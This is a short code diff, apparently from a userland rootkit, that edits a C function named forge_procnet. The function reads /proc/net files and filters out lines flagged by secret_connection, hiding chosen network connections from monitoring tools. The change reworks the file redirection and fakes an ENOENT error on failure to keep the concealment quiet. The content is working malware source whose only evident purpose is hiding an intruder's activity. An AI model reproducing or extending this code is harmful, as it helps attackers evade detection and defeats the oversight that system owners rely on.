@@ -90,14 +90,11 @@ FILE *forge_procnet(const char *pathname){
     FILE *tmp, *fp;
     char line[LINE_MAX];
 
-    hook(CFOPEN);
-    fp = call(CFOPEN, pathname, "r");
-    if(fp == NULL)
+    fp = redirstream(pathname, &tmp);
+    if(fp == NULL){
+        errno = ENOENT;
         return NULL;
-
-    tmp = tmpfile();
-    if(tmp == NULL)
-        return fp;
+    }
 
     while(fgets(line, sizeof(line), fp) != NULL)
         if(!secret_connection(line))
